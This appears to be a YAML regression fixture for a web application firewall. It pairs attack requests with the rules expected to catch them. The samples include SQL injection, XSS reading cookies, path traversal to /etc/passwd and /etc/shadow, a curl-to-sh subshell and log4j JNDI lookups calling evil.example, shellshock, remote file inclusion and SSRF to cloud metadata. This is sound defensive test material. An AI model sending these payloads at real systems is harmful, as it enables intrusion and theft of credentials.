# Regression samples. Add every false positive you find in production to `legit`,
# and every attack you want guaranteed coverage for to `attack` (optional `expect`).
attack:
  - {name: sqlmap UA, url: "/content/site/en.html", headers: {User-Agent: "sqlmap/1.8.3#stable (https://sqlmap.org)"}, expect: crs-913-scanner-user-agents}
  - {name: nuclei UA, url: "/", headers: {User-Agent: "Mozilla/5.0 Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"}, expect: crs-913-scanner-user-agents}
  - {name: traversal encoded, url: "/content/site/en.html?file=..%2f..%2f..%2fetc%2fpasswd", expect: crs-930-path-traversal}
  - {name: traversal plain, url: "/content/../../etc/passwd", expect: crs-930-path-traversal}
  - {name: git config, url: "/.git/config", expect: crs-930-restricted-files}
  - {name: dotenv, url: "/.env", expect: crs-930-restricted-files}
  - {name: aws creds, url: "/.aws/credentials", expect: crs-930-restricted-files}
  - {name: lfi in arg, url: "/content/site/en.html?page=/etc/shadow", expect: crs-930-lfi-os-files}
  - {name: sqli union, url: "/content/site/en/search.html?q=1%27%20UNION%20SELECT%20username,password%20FROM%20users--", expect: crs-942-sqli}
  - {name: sqli plus encoded, url: "/content/site/en/search.html?id=1+union+all+select+null,null--", expect: crs-942-sqli}
  - {name: sqli sleep, url: "/search?id=1%20AND%20SLEEP(5)", expect: crs-942-sqli}
  - {name: sqli tautology, url: "/search?user=admin%27%20or%20%271%27=%271", expect: crs-942-sqli}
  - {name: xss script, url: "/content/site/en/search.html?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", expect: crs-941-xss}
  - {name: xss svg onload, url: "/search?q=%3Csvg/onload=alert(1)%3E", expect: crs-941-xss}
  - {name: xss javascript uri, url: "/search?next=javascript:alert(1)", expect: crs-941-xss}
  - {name: rce unix, url: "/search?ip=127.0.0.1;cat%20/etc/passwd"}
  - {name: rce subshell, url: "/search?x=$(curl%20http://evil.example/x.sh|sh)"}
  - {name: shellshock UA, url: "/", headers: {User-Agent: "() { :; }; /bin/bash -c 'id'"}}
  - {name: log4j url, url: "/?x=$%7Bjndi:ldap://evil.example/a%7D", expect: crs-944-java-attack}
  - {name: log4j UA, url: "/", headers: {User-Agent: "${jndi:ldap://evil.example/a}"}, expect: aem-block-log4j-headers}
  - {name: java gadget, url: "/bin/x?cls=java.lang.Runtime", expect: crs-944-java-classes}
  - {name: rfi, url: "/x.html?include=http://203.0.113.9/shell.txt?"}
  - {name: ssrf metadata, url: "/proxy?url=http://169.254.169.254/latest/meta-data/", expect: crs-934-ssrf}
  - {name: crlf split, url: "/x?r=%0d%0aSet-Cookie:%20a=b", expect: crs-921-protocol-attack}
  - {name: wp probe, url: "/wp-login.php", expect: aem-block-foreign-tech-probes}
  - {name: php probe, url: "/index.php?s=/index/think", expect: aem-block-foreign-tech-probes}
  - {name: querybuilder, url: "/bin/querybuilder.json?path=/home&p.limit=-1", expect: aem-block-sensitive-paths-publish}
  - {name: infinity json, url: "/content/site.infinity.json", expect: aem-block-sensitive-paths-publish}
  - {name: felix console, url: "/system/console/bundles", expect: aem-block-sensitive-paths-publish}
  - {name: null byte, url: "/content/site/en.html%00.json", expect: aem-block-null-byte}
  - {name: oob callback, url: "/x?u=http://abc123.oast.fun", expect: aem-block-oob-callback-domains}
  - {name: fake googlebot, url: "/content/site/en.html", ip: "198.51.100.7", headers: {User-Agent: "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}, expect: bots-fake-google}
  - {name: fake bingbot, url: "/content/site/en.html", ip: "198.51.100.7", headers: {User-Agent: "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0 Safari/537.36"}, expect: bots-fake-bing}
  - {name: fake gptbot, url: "/content/site/en.html", ip: "198.51.100.7", headers: {User-Agent: "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; GPTBot/1.1; +https://openai.com/gptbot"}, expect: bots-fake-openai}
  - {name: AI training crawler CCBot, url: "/content/site/en.html", headers: {User-Agent: "CCBot/2.0 (https://commoncrawl.org/faq/)"}, expect: bots-ai-block}
  - {name: AI training Bytespider, url: "/", headers: {User-Agent: "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; spider-feedback@bytedance.com)"}, expect: bots-ai-block}
  - {name: AI training ClaudeBot, url: "/", headers: {User-Agent: "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; ClaudeBot/1.0; +claudebot@anthropic.com)"}, expect: bots-ai-block}
  - {name: python scraper, url: "/content/site/en.html", headers: {User-Agent: "python-requests/2.32.3"}, expect: bots-http-libraries}
  - {name: unknown crawler, url: "/content/site/en.html", headers: {User-Agent: "Mozilla/5.0 (compatible; RandomSpider/3.1)"}, expect: bots-generic-crawler-ratelimit}
  - {name: signed AI agent, url: "/content/site/en.html", headers: {Signature-Agent: '"https://chatgpt.com"'}, expect: bots-signed-agents}
  - {name: no UA, url: "/content/site/en.html", headers: {User-Agent: null}, expect: aem-no-user-agent}

